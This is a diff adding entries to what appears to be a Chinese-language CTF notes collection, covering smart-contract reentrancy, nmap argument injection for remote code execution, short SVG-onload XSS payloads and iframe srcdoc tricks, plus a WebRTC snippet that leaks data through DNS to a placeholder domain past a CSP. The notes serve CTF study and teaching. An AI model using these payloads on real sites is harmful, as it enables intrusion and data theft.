@@ -2826,3 +2826,36 @@ my.onload = function () {
 - solidity [Read-only reentrancy](https://medium.com/@zokyo.io/read-only-reentrancy-attacks-understanding-the-threat-to-your-smart-contracts-99444c0a7334)攻击。算reentrancy下的一个小分支，利用错误的逻辑导致程序读取一些重要的值时出错。这种攻击一般都出现在不遵守[Checks, Effects, Interactions](https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-11-coding-patterns/topic/checks-effects-interactions/)的代码中。Checks, Effects, Interactions指的是代码需要先检查，再更改状态，最后与用户交互。一个例子就是取钱逻辑，首先要判断用户是否有那么多的钱，然后在帐户上扣除相应的钱，最后再调用用户的诸如`payable(msg.sender).call`函数。如果反过来，检查后先与用户交互，再扣除钱，那么用户可以在call函数内再来一次取钱。因为状态未更新，凭空就多出来了双倍的钱
 - 简述一下这道题的Read-only reentrancy。在getGlobalInfo函数中，d和_totalVolumeGain的值正常情况下是一样的，`(d * 10 ** DECIMALS) / _totalVolumeGain`最终结果是`10 ** DECIMALS`，1后面跟着很多0。我们的目标是让这个结果包含更多数字（不只是1和0）。increaseVolume和decreaseVolume可以修改_totalVolumeGain，但是正常调用的话d的值也会改，效果就是_totalVolumeGain继续等于d。关键点在于decreaseVolume中有句`payable(msg.sender).sendValue(amount);`,此时其中一个值改了但另一个值没改（就是上面提到的Effects, Interactions反了）。那么就能在攻击合约的`receive()`函数中调用finish间接调用getGlobalInfo，利用d和_totalVolumeGain值不一样的时机完成攻击
 - 这题的代码似乎从 https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/ 更改而来
+294. [Play for Free](https://mcfx.us/posts/2023-09-01-sekaictf-2023-writeup/#blockchain-play-for-free)
+- Solang contract blockchain题目。目标是读取合约的private storage并与其交互。a Solang contract saves data in another data account/search value in dispatch table
+295. [Scanner Service](https://learn-cyber.net/writeup/Scanner-Service)
+- ruby的`to_i`函数将字符串转为数字，但是只要字符串以数字开头即可。如`"123abc".to_i`结果为123，不会报错
+- nmap参数注入。如果没法注入新的命令，单纯靠nmap的参数也可以rce。参考 https://gtfobins.github.io/gtfobins/nmap/ 和wp（需要公网ip,如果用ngrok转发的话注意过滤，需要把域名转成ip： https://siunam321.github.io/ctf/SekaiCTF-2023/Web/Scanner-Service/ ）
+- shell命令参数除了用`${IFS}`和空格隔开，还能用tab键
+296. [Golf Jail](https://blog.antoniusblock.net/posts/golfjail/)
+- iframe的srcdoc里的内容光用php的`htmlspecialchars`是不够的，因为srcdoc里的代码本身就能适配HTML entities。iframe里的csp遵循其parent的csp
+- 构造较短的js xss payload。参考 https://www.offensiveweb.com/docs/writeup/sekaictf2023_golfjail/ ，一般有3种做法：
+```html
+<!-- <svg/onload=xxx 也可以 -->
+<svg onload=eval(location)> <!-- about:srcdoc（如果在iframe里，这个不能用）-->
+<svg onload=eval(top.location)> <!-- http://urlOfThePage/... -->
+<svg onload=eval(baseURI)> <!-- http://urlOfThePage/... -->
+<svg onload=eval(location.hash)> <!-- 获取http://urlOfThePage/#content 中的#content部分。另外在iframe中这个值为空 -->
+```
+关于iframe里的payload再补充几句：
+```js
+//WORKING
+document.write("<iframe srcdoc='<script>alert(top.location)</script>'></iframe>")
+//NOT WORKING (Blocked by sandbox attribute)
+document.write("<iframe sandbox='allow-scripts' srcdoc='<script>alert(top.location)</script>'></iframe>")
+//Depends on Cross-Origin-Opener-Policy, 如果设置为same-origin就不能用
+document.write("<iframe sandbox='allow-scripts' srcdoc='<script>console.log(top.opener)</script>'></iframe>")
+```
+单纯eval baseURI会报错，可以参考wp里的闭合做法来执行有效payload
+- DNS exfiltration with WebRTC。当csp比较严（但是仍然可以执行代码，如`default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval'`）时，可以利用WebRTC来访问外部资源，绕过CSP
+```js
+pc = new RTCPeerConnection({"iceServers":[{"urls":["stun:"+ "data_want_to_exfiltrate"+"."+"mydomain.com"]}]});pc.createOffer({offerToReceiveAudio:1}).then(o=>pc.setLocalDescription(o));
+//mydomain.com 可以从 https://app.interactsh.com/#/ 拿一个免费的，用于detect out-of-band DNS interactions
+```
+wp里还有将要泄露的内容转换为符合域名规范的16进制的进阶payload。注意转为16进制内容可能会很长，而域名的每个label最长63个字符，超过后请求失败。所以需要手动发送多次payload，每次更改截取的索引。
+- 如果是借助get传payload，尽量将paylaod base64encdoe。不然浏览器会自动编码特殊字符
